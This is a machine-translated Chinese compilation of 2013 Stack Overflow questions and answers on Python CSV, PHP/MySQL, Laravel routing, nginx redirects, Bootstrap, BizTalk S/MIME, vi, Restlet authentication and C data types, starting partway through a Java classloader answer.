URL url = parentDir.toURL();
URL[] urls = new URL[]{url};
//Create a new class loader with the directory
ClassLoader cl = new URLClassLoader(urls); 
```

在此之后，你的类加载器搜索目录`file:///D:/Users/Ste.../bin/Test`是不正确的（这里没有`/Test/TestClass.class`匹配编译的`Test.TestClass`）

`startingDir + "/bin"`在这种情况下，您应该从而不是从创建您的类加载器`parentDir`。

如果您需要帮助来了解正在发生的事情，这是一个非常基本的[Java 包教程。](http://www.jarticles.com/package/package_eng.html)

# python - 从 For Loop Python csvreader 将完整记录写入 .csv 文件

> ID：15163276
> 
> 赞同：0
> 
> 时间：2013-03-01T17:19:01.700
> 
> 标签：python, csv

我正在尝试编写已通过 For, In 循环修改的 .csv 文件的整行。我已经设法让程序将密钥写入 csv 文件，但我无法让它将关联的值与这些密钥一起写入。我不确定是否需要嵌套另一个循环，或者我是否只是在语法上犯了错误。

```
import csv

def make_billing_dict(csv_dict_reader):
    bdict = {}
    for entry in csv_dict_reader:
    key = entry['BillingNumber']
    bdict[key] = entry
    return bdict

with open('old/MTBT.txt') as csv_file:
    old = csv.DictReader(csv_file)
    old_bills = make_billing_dict(old)

with open('new/MTBT.txt') as csv_file:
    new = csv.DictReader(csv_file)
    new_bills = make_billing_dict(new)

diff = file("diff/diff.csv", "wb" )
writer = csv.writer(diff)

for keys in old_bills:
    if old_bills[keys]['CustomerName'] != new_bills[keys]['CustomerName'] or old_bills[keys]['IsActive'] != new_bills[keys]['IsActive'] or old_bills[keys]['IsPayScan'] != new_bills[keys]['IsPayScan']:
        writer.writerow([keys])

#Used to send records to the console
#       print (new_bills[keys]['BillingNumber'],new_bills[keys]['CustomerName'],new_bills[keys]['IsActive'],new_bills[keys]['IsPayScan'],new_bills[keys]['IsCreditHold'],new_bills[keys]['City'],new_bills[keys]['State'])

#print set(new_bills.keys()) - set(old_bills.keys()) 
```

另外，我注意到，如果我添加一个新密钥并将条目添加到新文件中，它不会导致任何问题，但如果我删除一条记录，则会导致密钥错误。我明白为什么，因为它正在寻找原始字典中的密钥，但是有什么办法可以解决这个问题吗？

# php - mySQL 查询未在 PHP 中返回串联结果

> ID：15163283
> 
> 赞同：3
> 
> 时间：2013-03-01T17:19:33.087
> 
> 标签：php, mysql

我目前有一个可在 mySQL 工作台 5.2 中运行的 mySQL 查询，但不幸的是，当我将其转换为我的 php 文件时，CONCAT 函数只能获取 FirstName，但不能获取 LastName。如果我不使用单引号在名字和姓氏之间建立空格，我可以检索全名，但是当我添加空格代码时，它只检索名字。

例如，如果我不添加名称之间的间距并使用代码的此修改部分调用 EmployeeName ，则它可以工作：

```
 SELECT * , concat(FirstName,LastName) as 'EmployeeName' 
```

但输出将是 BruceWayne

下面的代码是我调用 EmployeeName 时 CONCAT 无法检索 LastName 的地方

```
 $sql = " 

      SELECT * , concat(FirstName," . "' '" . ",LastName) as 'EmployeeName'
      FROM tblEquipment e
      INNER JOIN tblEmployee em on em.employee_id = a.employee_id
      INNER JOIN tblStatus s on s.Status_id = e.equipment_id
      WHERE e.name = " . "'" . $q . "'" . ";
    ";

         while($row = mysql_fetch_array($result))
    {
          echo "
            <td>
                Equipment ID:
            </td>
            <td>
                <input type='text' size='25' disabled value = " . $row['Equipment_ID'] . ">
            </td>

            <td style='padding-left:10px;'>
                Currently Assigned To:
            </td>
            <td>
                <input type='text' size='25' disabled value = " . $row['EmployeeName'] . ">
            </td>
           ";
           } 
```

输出只有名字：布鲁斯。有没有人有什么建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:22:35.430

您`value=`在 HTML 标记中的属性没有被引用，因此只会接受第一个空格前面的一个单词。您应该转义并引用值属性。每当您将变量打印到 HTML 标记中时，您都需要通过`htmlspecialchars()`.

将变量打印到 HTML 标记属性中时，我建议使用[`htmlentities()`](http://us3.php.net/manual/en/function.htmlentities.php)选项`ENT_QUOTES`来转义属性内的单引号和双引号。

```
echo "
        <td>
            Equipment ID:
        </td>
        <td>
            <input type='text' size='25' disabled value='" . htmlentities($row['Equipment_ID'], ENT_QUOTES) . "'>
        </td>

        <td style='padding-left:10px;'>
            Currently Assigned To:
        </td>
        <td>
            <input type='text' size='25' disabled value='" . htmlentities($row['EmployeeName'], ENT_QUOTES) . "'>
        </td>
       ";
       } 
```

请注意，无需在您的 : 中断开字符串并连接`CONCAT()`：

```
" SELECT * , concat(FirstName, ' ',LastName) as 'EmployeeName 
```

同样在 中`WHERE`，`$q`可以直接插入到双引号字符串中。我们假设它已通过`mysql_real_escape_string()`. 从长远来看，考虑切换到支持预准备语句的 API。该`mysql_*()`API 在即将到来的 PHP 5.5 中面临弃用。

```
"WHERE e.name = '$q'"; 
```

# responsive-design - 媒体查询元标记不起作用

> ID：15163286
> 
> 赞同：1
> 
> 时间：2013-03-01T17:19:43.117
> 
> 标签：responsive-design, media

我正在开发一个响应式网站，当我在移动模拟器上查看该网站并重新调整浏览器大小时，所有响应都很完美，但是当我在实际移动设备上查看该网站时，该网站不会调整大小

这是我的 HTML 头

```
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="description" content="">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"></head> 
```

这是我的 CSS

```
 @media handheld, screen and (max-width: 768px), screen and (max-device-width: 768px) and (orientation: portrait) {{css styles}} 
```

有人帮忙吗？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-19T16:22:58.507

在 head 部分使用以下代码：

```
<meta name="viewport" content="width=device-width, initial-scale=1"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T11:23:01.807

删除手持设备的媒体查询，这些天手机属于屏幕区域。

查看[http://mediaqueriestest.com](http://mediaqueriestest.com)以准确了解您当前设备的响应情况。

# laravel - Laravel 4：无法为命名路由“登录”生成 URL，因为这样的路由不存在

> ID：15163289
> 
> 赞同：3
> 
> 时间：2013-03-01T17:19:55.393
> 
> 标签：laravel, laravel-4

我正在我的 Laravel 4 项目中创建一个授权系统。我正在尝试使用身份验证“之前”过滤器。

在我的`routes.php`文件中，我有：

```
Route::get('viewer', array('before' => 'auth', function() {
    return View::make('lead_viewer');
}));

Route::get('login', 'LoginController'); 
```

before 过滤器调用文件中的这一行`filters.php`：

```
Route::filter('auth', function()
{
    if (Auth::guest()) return Redirect::route('login');
}); 
```

我可以手动导航到我的登录路线。但是身份验证系统不会让这种情况发生。我已经跑`composer dump-autoload`了几次，所以这不是问题。我在做什么，因为如果我手动执行，我实际上可以加载登录页面？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:25:26.997

我想通了。Laravel 正在寻找一条命名路线：我必须这样做：

```
Route::get('login', array('as' => 'login', function() {
    return View::make('login');
})); 
```

Laravel 中一种有趣但不是很直观的方法。但泰勒这样做肯定有一个我没有看到的原因。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-09T16:27:27.453

要执行您在初始方法中尝试执行的操作，您可以执行以下操作：

```
Route::filter('auth', function()
{
    if (Auth::guest()) return Redirect::to('/login');
}); 
```

它会工作得很好。

如果您想使用命名路线，那么您可以按照您在回答自己的问题时发布的内容进行操作。本质上……不止一种给猫剥皮的方法。

希望有帮助

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-18T08:32:23.473

我知道你现在可能已经解决了这个问题，但是在尝试解决类似问题时偶然发现你的帖子后，我想分享我的想法......

Laravel 并**没有**为来宾方法寻找命名路由，它需要一个**path**。

您的示例有效，因为命名路由和路径相同，即“登录”。尝试将您的 URL 更改为“登录”以外的其他内容，然后看着它失败。

如果你想使用命名路由，你应该使用 route helper 方法......

```
if (Auth::guest()) return Redirect::guest( route('login') ) 
```

希望对某人有所帮助。

# java - 在生成的类文件中找不到符号错误

> ID：15163293
> 
> 赞同：0
> 
> 时间：2013-03-01T17:20:08.953
> 
> 标签：java, preprocessor, cup

我正在为一种小型编程语言设计一个编译器。我们得到了一个 java 预处理器（GEN 包），它生成编译器所需的 AST。我们必须将特定格式的输入语法提供给 GEN 文件。GEN 文件将自动生成 java 类文件。我的 GEN 文件正在正确编译。但是，无论我在 GEN 代码中进行什么更改，生成的 JAVA 类文件都会出现以下错误。

```
PcatParser.java:1022: cannot find symbol
symbol  : class trees
location: class pcat.CUP$PcatParser$actions 
```

我搜索了这个错误，发现它与使用了错误的包或未声明的变量有关。但是，在我的情况下，错误是在运行时出现的。我不确定这里出了什么问题。

```
/********************************************************************************
*
* File: pcat.gen
* The PCAT parser
*
********************************************************************************/

package pcat;

import Gen.*;
import java_cup.runtime.*;

parser code {:

//Terminal and non terminal declarations for the grammar

start with program;

program ::= PROGRAM IS body:b SEMI
{: PcatParser.program_AST = #<ProcDecs(ProcDec(main,NoTyp(),`b))>; :}
; 
```

PcatParser.program_AST 生成 PcatParser.java 类文件。#< > 语法用于为指定输入生成 AST。

# jquery - 如何使用 jQuery 操作 HTML5 数据-*？

> ID：15163294
> 
> 赞同：3
> 
> 时间：2013-03-01T17:20:12.107
> 
> 标签：jquery, html, html5-data

对于 HTML5 DOM 元素 -

```
<div style="border:1px solid; width:100px; background:#FFF" class="btn" data-btnNo="1">Button</div> 
```

下面的两条 javascript 行有什么区别？

```
$(this).attr("data-btnNo"); 
```

和

```
$(this).data("btnNo"); 
```

根据我[对 JSFiddle 的测试](http://jsfiddle.net/ckTjA/3/)，我看到第一个有效，而第二个无效。我试图理解“为什么？”

jQuery 是否为每个 DOM 元素维护单独的数据？根据 .data() 的[JQuery 文档](http://api.jquery.com/data/)，我了解到 .data() 将 HTML5 中的值`data-*`转换为它自己的数据。反过来是真的吗？如果我这样做`$(this).data("myData","jkl345");`，它会在 上创建一个 HTML5 属性`data-myData="jkl345"`吗`$(this)`？

我还遇到了[jQuery.data()](http://api.jquery.com/jQuery.data/)，它似乎扩展了 .data() 以将数据应用于任何 DOM 元素。

* * *

**稍后添加： '** [jQuery Data vs Attr?](https://stackoverflow.com/questions/7261619/jquery-data-vs-attr)似乎有一个答案？'。唯一没有回答的是`$(this).data("newDataAttri","myVal")`create `data-newDataAttri="myVal"`? 我开始相信它不会而且只会将它存储在 DOM 节点中。谁能证实这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:27:38.990

为了帮助调试使用控制台，`console.log($('.btn').data());`您将看到对象和键。你需要使用' `btnno`'小写'n'

# nginx - 带有 www 的 Nginx 子域

> ID：15163295
> 
> 赞同：0
> 
> 时间：2013-03-01T17:20:13.197
> 
> 标签：nginx, amazon-ec2

我在 Amazon EC2 服务器中配置了 Nginx。

现在 www.myserver.com 和 .myserver.com 都可以完美运行。

我需要的是配置 www..myserver.com。我需要将用户重定向到 .myserver.com。我的意思是，我需要重写 url 什么的。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:23:51.063

```
server {
    listen       80;
    server_name  www.myserver.com;
    return       301 http://myserver.com$request_uri;
} 
```

您不需要在 nginx 中“重写”。将它们留给 apache，并阅读文档：

*   [http://nginx.org/en/docs/http/server_names.html](http://nginx.org/en/docs/http/server_names.html)
*   [http://nginx.org/en/docs/http/request_processing.html](http://nginx.org/en/docs/http/request_processing.html)
*   [http://nginx.org/en/docs/http/converting_rewrite_rules.html](http://nginx.org/en/docs/http/converting_rewrite_rules.html)

**更新：**

您的问题并不清楚（谁知道，双点是什么意思）。但是，如果您曾经尝试阅读文档，则可以轻松地根据需要修改示例：

```
server {
    listen       80;
    server_name  ~^www\.([^.]+\.myserver\.com)$;
    return       301 http://$1$request_uri;
} 
```

# twitter-bootstrap - Bootstrap：带标题的内联表单

> ID：15163297
> 
> 赞同：0
> 
> 时间：2013-03-01T17:20:28.517
> 
> 标签：twitter-bootstrap

我正在尝试生成可在 Bootstrap 中编辑的内联表单。使用流动行时，我似乎无法控制布局，我需要在顶部设置一些标题，但不知道如何让它正确排列。

我已经分叉了一个[jsfiddle](http://jsfiddle.net/IPWright83/CdNef/243/)来说明这个想法。如您所见，控件重叠并不好。最初在一个内联表单之前，我试图使用一个表格，但发现各种输入控件真的不喜欢它。

```
<div id="wrapper" class="container-fluid">
<div class="row-fluid">
<form id="frmOptions" method="post" class="well form-inline span12">

     <div class="row-fluid">   
        <div id="formLeft" class="span3">
          <div class="control-group">
            <label for="select1" class="control-label">Option 1:</label>
            <div class="controls">
                <select id="select1">
                    <option>Something</option>
                </select>
                    <select id="select1">
                    <option>Something</option>
                </select>
            </div>      
          </div>
        </div>

        <div id="formCenter" class="span3">
          <div class="control-group">
            <label for="select2" class="control-label">Option 2:</label>
            <div class="controls">
                <select id="select2">
                    <option>Something</option>
                </select>
                 <select id="select2">
                    <option>Something</option>
                </select>
            </div>      
          </div>    
        </div>

        <div id="formRight" class="span3">
          <div class="control-group">
            <label for="select3" class="control-label">Option 3:</label>
            <div class="controls">
                <select id="select3">
                    <option>Something</option>
                </select>
                <select id="select3">
                    <option>Something</option>
                </select>
            </div>      
          </div>    
    </div>   

</form>
</div>
</div> 
```

有没有人有任何建议如何解决这个问题？如果需要，我准备使用引导选择器[http://silviomoreto.github.com/bootstrap-select/](http://silviomoreto.github.com/bootstrap-select/)但我还没有尝试过。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T18:16:02.913

将`span12`类添加到您的`<select>`元素中：http: [//jsfiddle.net/kaleb/CdNef/244/](http://jsfiddle.net/kaleb/CdNef/244/)

这修复了重叠。我希望这就是你要找的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:05:07.907

您可以执行以下操作以根据需要排列选择框：

JSfiddle[演示](http://jsfiddle.net/shail/CdNef/245/show/)

```
 .form-inline select {
 margin-bottom:10px;
 }
 @media (min-width: 768px) and (max-width: 979px) {
#frmOptions select {
     width:100%;
    }
    }
 @media (max-width: 767px) {
#frmOptions select {
     width:100%
    }
   }
 @media (max-width: 480px) {
  #frmOptions select {
     width:100%;
    }
  } 
```

顺便说一句，我认为您也可以通过这种方式创建表单，以后可能会对您有所帮助

[表单jsfiddle](http://jsfiddle.net/shail/sGgKE/)

# powershell - 向 BizTalk 发送 S/Mime 消息 - 但 Biztalk 无法对其进行解码

> ID：15163298
> 
> 赞同：0
> 
> 时间：2013-03-01T17:20:30.023
> 
> 标签：powershell, biztalk, smime

我正在尝试向 BizTalk 发送 S/Mime 消息，但它似乎无法接收。

我可以使用 BizTalk 证书和 System.Security.Cryptography.Pkcs 类从我的代码中加密和解密消息（我在 Powershell 中工作作为概念证明）。但是，当我尝试将其直接传递给 BizTalk 时，我会看到以下消息：

```
There was a failure executing the receive pipeline: 
[... application name ... ]
Source: "MIME/SMIME decoder" 
Receive Port: "ReceiveEncryptedPort" 
URI: "FORMATNAME:DIRECT=OS:.\PRIVATE$\encrypted_queue"
Reason: There was an authentication failure. "Failed to decode the S/MIME message. The S/MIME message may not be valid.". 
```

如果我在 BizTalk 中执行此操作，我可以创建一条正确使用的消息（当然，对人类和野兽都没有用）并且发现该消息的格式如下：

```
Mime Message with Base64 Encoded encrypted content.
    => Decrypts to Mime Message with Base64 Encoded Unicode content.
    => Decodes to message content. 
```

但是，当我使用我的 PowerShell 脚本重新创建相同的模式时，会出现上述异常。如果我发送在 BizTalk 中创建的工作消息的确切文字，它似乎可以正常工作，这意味着我在其他地方的编码存在问题，但是因为我已经从工作消息中复制了所有标题以在非工作消息中使用那些（除了我添加了一个新的 Content-Id ）我发现很难理解 BizTalk 失败的区别是什么。

示例消息如下所示：

```
Content-ID: {28c96069-f9a4-4cb3-9587-f1cb229dd54b} 
Bcc: MIME-Version 1.0
Content-type: application/x-pkcs7-mime; smime-type=enveloped-data; name="smime.p7m"
Content-Transfer-Encoding: base64

MIICggYJKoZIhvcNAQcDoIICczCCAm8CAQAxgcgwgcUCAQAwLjAaMRgwFgYDVQQDEw93d3cuZGxy
    -- More Base64 Encoded Text --
FZ6L1V+AylyzI7H+P0pmhA9yRl2Q/OiqRnNQ6tmw0mXkZxinuVryVha5aPkVhF19LJiS+vbjVWTF
jCDLdfJh4jMmOHlAiVOPc+TAIA== 
```

我想知道Powershell是否有可能以某种方式对文本进行了错误的编码-使用ASCII而不是Unicode或其他东西-但这似乎有点脆弱，并且使BizTalk看起来难以置信的脆弱。

我用来加密消息的代码是这样的：

```
function encryptWithCms( $text,  $certPath="cert:\CurrentUser\TrustedPeople", $certName="CN=myCertificate" )
{
   Add-Type -assemblyName "System.Security";
   $cert = Get-ChildItem $certPath | Where-Object { $_.Subject -eq $certName };
   $unicode = new-object System.Text.UnicodeEncoding;
   #this part copied directly from the internal message that BizTalk will accept.
   $pretext = @'
Content-Type: text/plain; charset="utf-16"
Content-Transfer-Encoding: base64
Content-Description: body

'@;
   $pretext+= "`r`n";
    $text = [System.Convert]::ToBase64String( $unicode.GetBytes( $text ));
    $text = $pretext+$text;
    Write-Host $text;
   $encryptData = $unicode.GetBytes( $text );
   $contentInfo = new-object System.Security.Cryptography.Pkcs.ContentInfo (,$encryptData);
   $cmsRecipient = new-object System.Security.Cryptography.Pkcs.CmsRecipient $cert;
   $envelopedCms = new-object System.Security.Cryptography.Pkcs.EnvelopedCms $contentInfo;
   $envelopedCms.Encrypt($cmsRecipient);
   return  [System.Convert]::ToBase64String($envelopedCms.Encode());
} 
```

为了把它变成一个 S/Mime 消息，我做了一些非常类似的事情，在一个heredoc 类型字符串的标题前面加上最后的加密文本，如上面的消息所示。为了便于阅读，我将它们放入 72 个字符块中，这与 BizTalk 所做的相同，并且在通过 PowerShell 运行时不会影响解密。

欢迎任何关于我需要做什么才能使这些请求正常工作的想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-23T12:27:42.823

以下问题的原因是提供的输入不是 MIME 格式。检查提供的输入，它接受 Base64 格式。

```
Error: There was an authentication failure. "Failed to decode the S/MIME message. The S/MIME message may not be valid.". 
```

如果 MIME 消息的格式错误，我们将面临这个问题。

# .net - ReCaptcha 适用于开发和 QA，但不适用于生产

> ID：15163300
> 
> 赞同：1
> 
> 时间：2013-03-01T17:20:36.390
> 
> 标签：.net, recaptcha

使用类似于 www.abc.com 的域为 Recaptcha 生成密钥。我们的开发和 QA 环境是使用 dev.abc.com 和 qa.abc.com 设置的。

Recaptcha 代码适用于开发和 QA，但每次在生产中都失败。我们在每个环境中使用相同的密钥集。我们已经检查了生产过程中的钥匙和其他所有东西，以确保所有东西都是醋酸盐。

生产环境在负载均衡器后面有 3 台服务器，负载均衡器使用两个内部 IP 将流量路由到 Web 服务器。这是生产和 QA 在架构方面的唯一区别。

当我尝试使用 Postman REST 客户端访问服务时，我始终收到以下错误 - false invalid-request-cookie。

我知道由于请求中的错误“挑战”参数可能会出现此错误。我该如何解决这个问题？是否有一些示例值可用于检查生产中的 ReCaptcha？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:37:29.743

您是否将密钥设置为全局... 在所有域上启用此密钥（全局密钥）。

[https://www.google.com/recaptcha](https://www.google.com/recaptcha)

# vi - 如何在 vi 中用 = 符号替换文本

> ID：15163304
> 
> 赞同：0
> 
> 时间：2013-03-01T17:20:48.143
> 
> 标签：vi

嗨，我正在尝试在 vi 上将短语“type=”替换为“engine=”的所有实例。我用

```
:s/type=/engine=/g and also :s/type\=/engine\=/g 
```

都给我“type= 或 type\= not found”。我怎样才能在vi上做到这一点？...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:25:24.747

尝试：

`:%s/type=/engine=/g`

该`%`符号允许您对文件中的每一行进行匹配。没有它，您只会尝试匹配光标所在的行，因此如果您不在正确的行上，它将找不到您要查找的短语。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T17:28:18.793

您忘记了 s 前面的“%”。您的命令只会影响当前文本行。尝试

```
:%s/type=/engine=/g 
```

# python - 为什么我必须将数字转换为字符串才能获取其位置？

> ID：15163307
> 
> 赞同：0
> 
> 时间：2013-03-01T17:20:59.987
> 
> 标签：python

为什么在我将其转换为字符串之前它不会打印出整数/浮点数的位置？例子

```
x = 123
print x[0] # error 
```

要解决这个问题，我必须做

```
x = 123
print str(x)[0] 
```

但是为什么我必须把它变成一个字符串才能工作呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T17:27:29.743

那么，为什么这首先应该起作用？一个数的第 n 个索引是多少；十进制数 123 的索引 0 是什么？

*   是`1`因为它的十进制表示吗？
*   是`7`因为它的十六进制表示（`7B`）吗？
*   是`0`因为它的十六进制表示（`0x7B`）吗？
*   是`1`因为它的八进制表示（`173`）吗？
*   是`0`因为它的八进制表示（`0173`）吗？
*   是不是`1`因为它的二进制表示 ( `1111011`)
*   是`1`因为它的二进制表示是最低有效位在前（`1101111`）？
*   是`S`因为那`123`是ASCII中的内容吗？
*   …</li>

如您所见，这是非常不清楚的，并且从一开始就没有意义。在列表上使用索引访问时，您将获得列表的第 n 个元素。当您对序列使用索引访问时，您将获得序列的第 n 个元素。字符串是一个字符序列，因此在对字符串使用索引访问时，会得到字符串序列的第 n 个元素；第 n 个字符。数字不是序列，只有某种格式的字符串表示才是。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T17:29:56.180

123 只是整数值的*一种表示*。Python`int`值不是序列或映射，因此`[item]`索引对它们没有意义。

通过将数字转换为字符串，您可以将表示“捕获”为一系列数字字符，然后您可以获得第一个字符。

另一种方法是除以 10，直到你的数字小于 10：

```
x = 123
while x > 10:
    x //= 10

print x  # prints the number 1 
```

请注意，`x`then 包含一个`int`静止的，而不是单个字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:26:38.537

简单的答案是因为你有错误的类型。整数不支持索引——我真的认为它们不应该（它们不是序列或映射，我想不出索引整数实际上有意义的任何方式）。

请注意，表示整数的方法也不止一种：

```
>>> 0x7b == 123
True 
```

那么在这种情况下，谁说`x[0]`应该返回`1`而不是`0`（或`7`）取决于您的想法？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T17:31:33.073

作为上述出色答案的旁注，这是您可以将数字转换为数字列表以允许索引的一种方法：

```
In [2]: map(int,str(123))
Out[2]: [1, 2, 3]

In [3]: map(int,str(123))[0]
Out[3]: 1

In [4]: type(map(int,str(123))[0])
Out[4]: int 
```

# apache - Restlet 用户身份验证

> ID：15163312
> 
> 赞同：0
> 
> 时间：2013-03-01T17:21:10.777
> 
> 标签：apache, cookies, ssl, restlet, authentication

我对 Restlet 比较陌生，所以目前我正在尝试使用 Restlet 2.1，我想添加用户身份验证

我目前正在使用 Apache ReverseProxy，并计划将其用作 SSL 代理，所以我可能会在 Apache 上加密/解密，Restlet 将得到纯文本

我发现了有关使用 Restlet ChallengeAuthentication 的说法，但在 2.1 API 文档上找不到它，而且由于 Restlet 刚刚更新了他们的网站，大多数 Url 都被破坏了

因此，如果有人能给我一些关于如何构建它的指南或给我一些示例的功能链接，那就太好了，例如：我如何检查身份验证，

我如何检测cookie，

如何设置安全 cookie，

我如何从那个加密的 cookie 中读取

还有另一个设计问题，我是否会更好地使用尝试解密用于身份验证的库克的功能，而不是将cookie数据实际存储在像Redis这样的数据库中？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-26T11:19:18.273

我在 GAE 上使用 2.1.2 restlet 进行了身份验证。以下代码可以帮助您如何在 restlet 中提供身份验证

```
ChallengeAuthenticator guard = new ChallengeAuthenticator(getContext().createChildContext(), ChallengeScheme.HTTP_BASIC,"Your application."); 
MapVerifier verifier = new MapVerifier();  
verifier.getLocalSecrets().put(userName, password.toCharArray());
guard.setVerifier(verifier);
guard.setNext(this);
guard.setNext(anyclass.class);
router.attach("/v1", guard); 
```

这个链接[http://restlet.org/learn/tutorial/2.1/](http://restlet.org/learn/tutorial/2.1/)了解更多关于restlet的信息。

# c# - 是否有任何事件可以捕获不正确地关闭应用程序？

> ID：15163315
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:21:13.273
> 
> 标签：c#, wpf, sql-server-2008

我有 wpf、c#、sql express 应用程序，这意味着带有数据库的软件。假设我有一个选项卡项，在选项卡项内部有数据网格。我从一个数据网格购买人员并将其放入篮子数据网格。假设在我的主数据网格中有 10 支铅笔，我买了 5 支。现在主数据网格中有 5 支，篮子数据网格中有 5 支。直到我按下购买按钮，它才会留在篮子里。现在我的问题是，假设断电并且我的应用程序已关闭。在我的主数据网格中，初始化后网格为 5，篮子为 0。所以我失去了我篮子里的东西。我可以在关闭应用程序或关闭选项卡项目时管理它。但无法管理它，当应用程序关闭不正确时。在c#中是否有任何机制、方法、事件来处理这个？我知道你们中的大多数人会说使用事务，我将在下一个版本中使用，但不会很快。现在我想找到如何在没有交易的情况下处理这个问题。我希望你明白我的意思。有任何想法吗？

这里的示例假设您在库存（主数据网格）中提供了 12 支钢笔和 15 支铅笔。您正在从库存中出售 2 支钢笔和 5 支铅笔。当您出售时，它将进入篮子数据网格。现在在主数据网格中有 10 支钢笔和 10 支铅笔。在篮子里有 2 支钢笔和 5 支铅笔。如果我不点击提交按钮，它将不会记录在销售数据库中。假设我正在工作和销售库存中的物品并且电力下降。我的存货中有 10 支钢笔和 10 支铅笔。篮子是空的。由于没有点击按钮，所以没有记录在销售数据库中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:24:31.967

最简单的方法是在添加项目时在数据库中设置脏标志以及篮子的详细信息。

然后在结帐过程完成时清除脏标志。

然后，当您重新启动应用程序时，请检查此标志。如果很清楚，那么您可以从头开始。如果已设置，则拉回篮子的详细信息并根据需要进行处理。

它不是很干净，但它会完成工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-02T10:57:20.013

所以我仍然不确定这在你的代码中是如何工作的，但我会给你两种方式的答案：

1.  如果您仅将库存数据（进入主网格的数据）存储在数据库中，那么当应用程序关闭时，您将丢失篮子中的所有内容，因为内存丢失了。如果是这种情况，您唯一的解决方案是将数据也存储在数据库的篮子中。

2.  如果您将 bot 库存和购物篮数据存储在数据库中，那么您将拥有如下代码：

```
 update inventory
    update basket 
```

如果您的问题是应用程序在这两行代码之间被强制关闭，那么唯一的解决方案是添加事务范围：

```
start transaction
update inventory
update basket
end transaction 
```

这是确保数据安全的唯一途径。

如果您在案例 1 中，您应该实施解决方案，但这实际上会给您带来案例 2。所以我建议您不要等到下一个版本来实施事务范围。

我希望这有帮助。

# c - C如何知道期望什么类型？

> ID：15163316
> 
> 赞同：13
> 
> 时间：2013-03-01T17:21:16.923
> 
> 标签：c, memory, twos-complement, single-precision

如果所有值都只是一个或多个字节，并且没有一个字节可以包含元数据，那么系统如何跟踪一个字节代表的数字类型？在 Wikipedia 上查看 Two's Complement 和 Single Point 揭示了这些数字如何以基数 2 表示，但我仍然想知道编译器或处理器（不确定我在这里真正处理的是哪个）确定这个字节*必须*是一个有符号整数。

这类似于收到一封加密的信件，然后看着我的密码书架，想知道该拿哪一个。一些指标是必要的。

如果我考虑我可以做些什么来解决这个问题，我会想到两个解决方案。要么我会要求一个额外的字节并用它来存储描述，要么我会专门为数字表示分配内存部分；有符号数的部分，浮点数的部分等。

我主要**在 Unix 系统上处理 C，**但这可能是一个更普遍的问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T17:42:26.210

> 系统如何跟踪一个字节代表的数字类型？

“系统”没有。在翻译期间，*编译器*知道它正在处理的对象的类型，并生成适当的机器指令来处理这些值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:39:40.873

执行的代码没有关于类型的信息。唯一知道类型的工具是编译代码时的编译器。C 中的类型只是编译时的限制，以防止您在某处使用错误的类型。在编译时，C 编译器会跟踪每个变量的类型，因此知道哪个类型属于哪个变量。

例如，这就是您需要在 中使用格式字符串的原因`printf`。`printf`由于此信息丢失，因此无法知道它将在参数列表中获得什么类型。在像 go 或 java 这样的语言中，您有一个具有反射功能的运行时，这使得获取类型成为可能。

假设您编译的 C 代码中仍有类型信息，则需要生成的汇编语言来检查类型。事实证明，在汇编中唯一接近类型的是由[后缀（在 GAS 中）](http://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax#Operation_Suffixes)确定的指令的操作数大小。因此，您的类型信息中剩下的就是大小，仅此而已。

支持类型的程序集的一个示例是 java VM 字节码，它具有[用于原语操作数的](http://en.wikipedia.org/wiki/Java_bytecode#Instructions)类型后缀。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:37:18.163

重要的是要记住 C 和 C++ 是高级语言。编译器的工作是获取代码的纯文本表示并将其构建到目标平台期望执行的平台特定指令中。对于大多数使用 PC 的人来说，这往往是[x86 汇编](http://en.wikipedia.org/wiki/X86_assembly_language)。

这就是 C 和 C++ 对基本数据类型的定义如此宽松的原因。例如，大多数人说一个字节有 8 位。这不是由标准定义的，并且没有什么反对某些机器每字节 7 位作为其对数据的本机解释。该标准仅承认字节是数据的最小可寻址单元。

所以数据的解释取决于处理器的指令集。在许多现代语言中，在此之上还有另一个抽象，即[虚拟机](http://en.wikipedia.org/wiki/Virtual_machine)。

如果您编写自己的脚本语言，则由您来定义如何在软件中解释数据。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T17:28:01.080

哦，好问题。让我们从 CPU 开始——假设是 Intel x86 芯片。

事实证明，CPU 不*知道*一个字节是“有符号”还是“无符号”。因此，当您添加两个数字或进行任何操作时，会设置一个“[状态寄存器](http://en.wikipedia.org/wiki/Status_register)”标志。

看看“标志标志”。当您添加两个数字时，CPU 会执行此操作 - 将数字相加并将结果存储在寄存器中。但是 CPU 说“如果我们将这些数字解释为二进制补码有符号整数，结果是否为负？” 如果是这样，则该“标志标志”设置为 1。

